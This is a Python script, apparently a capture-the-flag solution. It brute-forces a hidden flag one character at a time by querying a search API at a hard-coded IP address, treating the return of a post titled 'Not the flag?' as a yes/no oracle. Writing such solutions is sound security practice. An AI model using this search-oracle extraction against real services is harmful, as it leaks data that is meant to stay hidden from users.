import requests
import string

URL = "http://34.134.162.213:17000/api/search"
FLAG_LENGTH = 24
CHARS = "`~!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?" + string.digits + string.ascii_letters
flag = "L3AK{"


def search_query(query):
    try:
        response = requests.post(URL, json={"query": query})
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Server returned status {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Request failed: {e}")
    return None


def check_in_flag_post(substring):
    result = search_query(substring)
    if result and result.get("results"):
        for post in result["results"]:
            if post.get("title") == "Not the flag?":
                return True
    return False


print("=== EXTRACTING FLAG ===")
while len(flag) < FLAG_LENGTH:
    print(f"\nCurrent flag: {flag} (length: {len(flag)} of {FLAG_LENGTH})")

    test = flag[-2:]
    print(f"Testing {test} + ?")

    for char in CHARS:
        test_str = test + char
        if check_in_flag_post(test_str):
            print(f"Found valid char: {char}")
            flag += char
            break

print("\n=== FINAL RESULT ===")
print(f"Extracted flag: {flag}")
